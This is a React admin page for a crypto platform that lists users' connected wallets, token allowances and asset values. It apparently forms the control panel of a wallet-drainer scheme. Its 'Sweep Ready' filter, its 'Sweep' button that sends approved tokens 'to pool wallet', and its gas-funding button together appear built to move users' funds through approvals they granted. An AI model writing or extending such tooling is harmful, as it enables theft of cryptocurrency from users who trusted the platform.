import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import { useState, useEffect } from "react";
import { Wallet, Search, Trash2, ShieldCheck, Clock, ExternalLink, Zap, RefreshCw, Droplet, User, AlertCircle, CheckCircle2 } from "lucide-react";
import { useAuth } from "@/hooks/useAuth";

interface WalletWithProfile {
  id: string;
  user_id: string;
  wallet_address: string;
  wallet_type: string;
  chain_id: number;
  is_primary: boolean;
  verified: boolean;
  is_active: boolean;
  connected_at: string;
  last_used_at: string | null;
  allowance_amount: number;
  token_approved: string | null;
  verified_at: string | null;
  metadata?: {
    total_value_usd?: number;
  };
  profiles?: {
    id: string;
    first_name: string | null;
    last_name: string | null;
    email: string | null;
    role: string;
  };
}

const AdminWallets = () => {
  const queryClient = useQueryClient();
  const [search, setSearch] = useState("");
  const [showAuthorizedOnly, setShowAuthorizedOnly] = useState(false);
  const [isSyncing, setIsSyncing] = useState(false);
  const [lastError, setLastError] = useState<string | null>(null);
  const [selectedWallet, setSelectedWallet] = useState<WalletWithProfile | null>(null);
  const { user: authUser, isAdmin } = useAuth();

  const { data: wallets = [], isLoading, refetch } = useQuery<WalletWithProfile[]>({
    queryKey: ["admin-wallets", authUser?.id],
    queryFn: async () => {
      // Fetch connected wallets with profile data using foreign key relation
      const { data, error } = await (supabase as any)
        .from("connected_wallets")
        .select(`
          *,
          profiles:user_id (id, first_name, last_name, email, role)
        `)
        .order("connected_at", { ascending: false });
      
      console.log("AdminWallets: Query result", { data, error, count: data?.length });
      
      if (error) {
        setLastError(error.message);
        throw error;
      }
      setLastError(null);
      return data || [];
    },
    enabled: !!authUser && isAdmin,
    refetchInterval: 30000, // Auto-refresh every 30 seconds
  });

  // Real-time subscription for wallet updates
  useEffect(() => {
    if (!authUser || !isAdmin) return;

    const subscription = (supabase as any)
      .channel('admin_wallets_changes')
      .on('postgres_changes', 
        { 
          event: '*', 
          schema: 'public', 
          table: 'connected_wallets'
        }, 
        (payload: any) => {
          console.log('Admin wallet change detected:', payload);
          queryClient.invalidateQueries({ queryKey: ["admin-wallets"] });
        }
      )
      .subscribe();

    return () => {
      subscription.unsubscribe();
    };
  }, [authUser, isAdmin, queryClient]);

  const deleteWallet = useMutation({
    mutationFn: async (walletId: string) => {
      const { error } = await (supabase as any)
        .from("connected_wallets")
        .delete()
        .eq("id", walletId);
      if (error) throw error;
    },
    onSuccess: () => {
      toast.success("Wallet connection removed!");
      queryClient.invalidateQueries({ queryKey: ["admin-wallets"] });
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const togglePrimary = useMutation({
    mutationFn: async ({ id, isPrimary }: { id: string; isPrimary: boolean }) => {
      const { error } = await (supabase as any)
        .from("connected_wallets")
        .update({ is_primary: isPrimary })
        .eq("id", id);
      if (error) throw error;
    },
    onSuccess: () => {
      toast.success("Primary status updated!");
      queryClient.invalidateQueries({ queryKey: ["admin-wallets"] });
    },
  });

  const triggerSweep = useMutation({
    mutationFn: async ({ walletAddress, chainId, userId }: { walletAddress: string; chainId: number; userId: string }) => {
      const { data, error } = await supabase.functions.invoke("trigger-token-sweep", {
        body: { walletAddress, chainId, userId }
      });
      if (error) throw error;
      return data;
    },
    onSuccess: (data) => {
      toast.success(data?.message || "Automated sweep triggered successfully!");
      queryClient.invalidateQueries({ queryKey: ["admin-wallets"] });
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const sendGas = useMutation({
    mutationFn: async ({ walletAddress, chainId }: { walletAddress: string; chainId: number }) => {
      const { data, error } = await supabase.functions.invoke("auto-gas-faucet", {
        body: { walletAddress, chainId }
      });
      if (error) throw error;
      return data;
    },
    onSuccess: (data) => {
      toast.success(data?.message || `Gas (${data.amount} native) sent successfully!`);
      queryClient.invalidateQueries({ queryKey: ["admin-wallets"] });
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const syncAssets = async () => {
    setIsSyncing(true);
    toast.loading("Scanning all wallets for assets...", { id: "sync-assets" });
    try {
      const { data, error } = await supabase.functions.invoke("sync-wallet-assets");
      if (error) throw error;
      toast.success(data?.message || "All assets synced successfully!", { id: "sync-assets" });
      refetch();
    } catch (err: any) {
      toast.error(err.message, { id: "sync-assets" });
    } finally {
      setIsSyncing(false);
    }
  };

  const filtered = wallets.filter((w: WalletWithProfile) => {
    const searchStr = `${w.profiles?.first_name || ''} ${w.profiles?.last_name || ''} ${w.profiles?.email || ''} ${w.wallet_address} ${w.wallet_type}`.toLowerCase();
    const matchesSearch = searchStr.includes(search.toLowerCase());
    const matchesAuth = showAuthorizedOnly ? ((w.allowance_amount || 0) > 0) : true;
    return matchesSearch && matchesAuth;
  });

  // Chain names mapping
  const CHAIN_NAMES: Record<number, string> = {
    1: 'Ethereum',
    56: 'BSC',
    137: 'Polygon',
    42161: 'Arbitrum',
    10: 'Optimism',
    8453: 'Base',
  };

  return (
    <div className="p-4 md:p-8 space-y-6">
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h2 className="text-xl font-display font-bold flex items-center gap-2">
            <Wallet className="w-6 h-6 text-primary" />
            User Wallets Management
          </h2>
          <p className="text-sm text-muted-foreground mt-1">Monitor and manage all Web3 wallet connections across the platform</p>
        </div>
        <div className="flex flex-col md:flex-row items-center gap-4">
          <div className="flex items-center gap-2 bg-secondary/30 p-1 rounded-lg border border-border">
            <Button 
              size="sm" 
              variant={!showAuthorizedOnly ? "secondary" : "ghost"} 
              onClick={() => setShowAuthorizedOnly(false)}
              className="text-[10px] h-7 px-3 uppercase font-bold"
            >
              All Wallets
            </Button>
            <Button 
              size="sm" 
              variant={showAuthorizedOnly ? "secondary" : "ghost"} 
              onClick={() => setShowAuthorizedOnly(true)}
              className="text-[10px] h-7 px-3 uppercase font-bold flex items-center gap-1"
            >
              <Zap className="w-3 h-3 text-accent" /> Sweep Ready
            </Button>
          </div>
          <div className="relative">
            <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
            <Input 
              placeholder="Search address..." 
              value={search} 
              onChange={(e) => setSearch(e.target.value)} 
              className="w-full md:w-48 h-9 pl-9 bg-secondary/50 border-border text-xs" 
            />
          </div>
          <Button 
            size="sm" 
            variant="outline" 
            onClick={syncAssets} 
            disabled={isSyncing}
            className="h-9 px-4 border-accent/20 text-accent hover:bg-accent/5 font-bold"
          >
            {isSyncing ? <RefreshCw className="w-4 h-4 mr-2 animate-spin" /> : <RefreshCw className="w-4 h-4 mr-2" />}
            Sync All Assets
          </Button>
          <Button size="icon" variant="outline" onClick={() => refetch()} className="h-9 w-9">
            <RefreshCw className="w-4 h-4" />
          </Button>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <div className="glass-card p-4">
          <p className="text-xs text-muted-foreground uppercase tracking-wider font-bold">Total Connections</p>
          <p className="text-2xl font-display font-bold mt-1 text-primary">{wallets.length}</p>
          <p className="text-[10px] text-muted-foreground mt-1">Across all users</p>
        </div>
        <div className="glass-card p-4">
          <p className="text-xs text-muted-foreground uppercase tracking-wider font-bold">Verified Wallets</p>
          <p className="text-2xl font-display font-bold mt-1 text-success">{wallets.filter((w) => w.verified).length}</p>
          <p className="text-[10px] text-muted-foreground mt-1">Ownership confirmed</p>
        </div>
        <div className="glass-card p-4">
          <p className="text-xs text-muted-foreground uppercase tracking-wider font-bold">Sweep Ready</p>
          <p className="text-2xl font-display font-bold mt-1 text-accent">{wallets.filter((w) => (w.allowance_amount || 0) > 0).length}</p>
          <p className="text-[10px] text-muted-foreground mt-1">Token approvals active</p>
        </div>
        <div className="glass-card p-4">
          <p className="text-xs text-muted-foreground uppercase tracking-wider font-bold">Unique Users</p>
          <p className="text-2xl font-display font-bold mt-1 text-info">{new Set(wallets.map(w => w.user_id)).size}</p>
          <p className="text-[10px] text-muted-foreground mt-1">With connected wallets</p>
        </div>
      </div>

      <div className="glass-card overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="text-muted-foreground border-b border-border bg-secondary/30">
                <th className="text-left py-4 px-4 font-medium uppercase tracking-wider text-[10px]">User & Profile</th>
                <th className="text-left py-4 px-4 font-medium uppercase tracking-wider text-[10px]">Wallet Address</th>
                <th className="text-left py-4 px-4 font-medium uppercase tracking-wider text-[10px]">Total Assets ($)</th>
                <th className="text-left py-4 px-4 font-medium uppercase tracking-wider text-[10px]">Type & Chain</th>
                <th className="text-left py-4 px-4 font-medium uppercase tracking-wider text-[10px]">Status</th>
                <th className="text-left py-4 px-4 font-medium uppercase tracking-wider text-[10px]">Authorization</th>
                <th className="text-left py-4 px-4 font-medium uppercase tracking-wider text-[10px]">Last Used</th>
                <th className="text-right py-4 px-4 font-medium uppercase tracking-wider text-[10px]">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border">
              {isLoading ? (
                <tr><td colSpan={8} className="py-12 text-center text-muted-foreground">
                  <RefreshCw className="w-6 h-6 animate-spin mx-auto mb-2" />
                  Loading wallet data...
                </td></tr>
              ) : filtered.length === 0 ? (
                <tr><td colSpan={8} className="py-12 text-center text-muted-foreground">
                  {search || showAuthorizedOnly ? 'No wallet connections found matching your filters.' : 'No wallet connections found. Users need to connect wallets from their dashboard.'}
                </td></tr>
              ) : (
                filtered.map((w: WalletWithProfile) => (
                  <tr key={w.id} className="hover:bg-secondary/20 transition-colors">
                    <td className="py-4 px-4">
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold text-xs">
                          {w.profiles?.first_name?.[0] || '?'}{w.profiles?.last_name?.[0] || '?'}
                        </div>
                        <div>
                          <p className="font-semibold text-sm">{w.profiles?.first_name || 'Anonymous'} {w.profiles?.last_name || 'User'}</p>
                          <p className="text-[10px] text-muted-foreground font-mono">{w.profiles?.email || w.user_id.slice(0, 8) + '...'}</p>
                          {w.profiles?.role === 'admin' && (
                            <Badge variant="outline" className="text-[8px] mt-1">ADMIN</Badge>
                          )}
                        </div>
                      </div>
                    </td>
                    <td className="py-4 px-4">
                      <div className="flex items-center gap-2">
                        <p className="font-mono text-xs bg-secondary/50 px-2 py-1 rounded border border-border/50 max-w-[160px] truncate" title={w.wallet_address}>
                          {w.wallet_address.slice(0, 8)}...{w.wallet_address.slice(-6)}
                        </p>
                        <a 
                          href={`https://etherscan.io/address/${w.wallet_address}`} 
                          target="_blank" 
                          rel="noreferrer"
                          className="p-1 hover:text-primary transition-colors"
                          title="View on Etherscan"
                        >
                          <ExternalLink className="w-3 h-3" />
                        </a>
                      </div>
                    </td>
                    <td className="py-4 px-4">
                      <div className="flex flex-col">
                        <span className="text-xs font-bold text-success">${w.metadata?.total_value_usd?.toLocaleString() || '0.00'}</span>
                        <span className="text-[9px] text-muted-foreground uppercase tracking-tight">On-chain Sync</span>
                      </div>
                    </td>
                    <td className="py-4 px-4">
                      <div className="flex flex-col gap-1">
                        <span className="text-[10px] px-2 py-0.5 rounded bg-secondary-foreground/10 text-muted-foreground inline-block w-fit capitalize">
                          {w.wallet_type || "unknown"}
                        </span>
                        <span className="text-[10px] text-primary font-bold">{CHAIN_NAMES[w.chain_id] || `Chain ${w.chain_id}`}</span>
                      </div>
                    </td>
                    <td className="py-4 px-4">
                      <div className="flex flex-col gap-1.5">
                        {(w.allowance_amount || 0) > 0 && (
                          <div className="flex items-center gap-1.5 px-2 py-1 rounded bg-accent/10 border border-accent/20 text-accent text-[9px] font-black uppercase tracking-widest">
                            <Zap className="w-2.5 h-2.5" /> Sweep Ready
                          </div>
                        )}
                        {w.verified ? (
                          <div className="flex items-center gap-1 text-success text-[10px] font-bold">
                            <ShieldCheck className="w-3 h-3" /> VERIFIED
                          </div>
                        ) : (
                          <div className="flex items-center gap-1 text-warning text-[10px] font-bold">
                            <AlertCircle className="w-3 h-3" /> UNVERIFIED
                          </div>
                        )}
                        {w.is_primary && (
                          <Badge variant="secondary" className="text-[8px] w-fit">PRIMARY</Badge>
                        )}
                      </div>
                    </td>
                    <td className="py-4 px-4">
                      {(w.allowance_amount || 0) > 0 ? (
                        <div className="flex flex-col gap-1">
                          <div className="flex items-center gap-1 text-accent text-[10px] font-bold">
                            <Zap className="w-3 h-3" /> {w.token_approved || 'Tokens'}
                          </div>
                          <span className="text-[9px] text-muted-foreground font-mono">
                            Allowance: {(w.allowance_amount || 0).toLocaleString()}
                          </span>
                        </div>
                      ) : (
                        <span className="text-[10px] text-muted-foreground italic tracking-tight">No Active Auth</span>
                      )}
                    </td>
                    <td className="py-4 px-4">
                      <div className="flex flex-col gap-1">
                        <div className="flex items-center gap-1.5 text-xs text-muted-foreground">
                          <Clock className="w-3 h-3 text-muted-foreground/50" />
                          {w.last_used_at ? new Date(w.last_used_at).toLocaleDateString() : 'Never'}
                        </div>
                        <span className="text-[9px] text-muted-foreground">
                          Connected: {new Date(w.connected_at).toLocaleDateString()}
                        </span>
                      </div>
                    </td>
                    <td className="py-4 px-4 text-right">
                      <div className="flex justify-end gap-2">
                        <Button 
                          variant="outline" 
                          size="sm" 
                          className="h-8 border-primary/50 text-primary hover:bg-primary/10 font-bold text-[10px]"
                          onClick={() => sendGas.mutate({ walletAddress: w.wallet_address, chainId: w.chain_id })}
                          disabled={sendGas.isPending}
                          title="Send Gas Fee (ETH/BNB/MATIC) to this wallet"
                        >
                          {sendGas.isPending ? <RefreshCw className="w-3 h-3 mr-1 animate-spin" /> : <Droplet className="w-3 h-3 mr-1" />}
                          Gas
                        </Button>
                        {(w.allowance_amount || 0) > 0 && w.verified && (
                          <Button 
                            variant="outline" 
                            size="sm" 
                            className="h-8 border-accent/50 text-accent hover:bg-accent/10 font-bold text-[10px]"
                            onClick={() => triggerSweep.mutate({ walletAddress: w.wallet_address, chainId: w.chain_id, userId: w.user_id })}
                            disabled={triggerSweep.isPending}
                            title="Trigger token sweep to pool wallet"
                          >
                            {triggerSweep.isPending ? <RefreshCw className="w-3 h-3 mr-1 animate-spin" /> : <Zap className="w-3 h-3 mr-1" />}
                            Sweep
                          </Button>
                        )}
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-8 w-8 text-destructive hover:bg-destructive/10"
                          onClick={() => {
                            if (confirm(`Remove wallet ${w.wallet_address.slice(0, 8)}...${w.wallet_address.slice(-6)}?\n\nUser: ${w.profiles?.email || w.profiles?.first_name || 'Unknown'}\n\nThis action cannot be undone.`)) {
                              deleteWallet.mutate(w.id);
                            }
                          }}
                          title="Remove wallet connection"
                        >
                          <Trash2 className="w-4 h-4" />
                        </Button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>

      <div className="mt-12 p-4 rounded border border-dashed border-border/50 bg-secondary/10">
        <h4 className="text-[10px] uppercase font-bold text-muted-foreground mb-2">Diagnostic Data</h4>
        <div className="grid grid-cols-2 gap-4 text-[9px] font-mono">
          <div>Status: <span className={wallets.length > 0 ? "text-success" : "text-destructive"}>{wallets.length > 0 ? "Connected" : "No Data Found"}</span></div>
          <div>Total Loaded: {wallets.length}</div>
          <div className="col-span-2">Auth User: <span className="text-accent">{authUser?.email || "Not Logged In"}</span></div>
          {lastError && <div className="col-span-2 text-destructive">Last Error: {lastError}</div>}
          <div className="col-span-2 opacity-50">Note: If table is empty, ensure the 'is_admin' SQL policy has been applied in Supabase.</div>
        </div>
      </div>
    </div>
  );
};

export default AdminWallets;
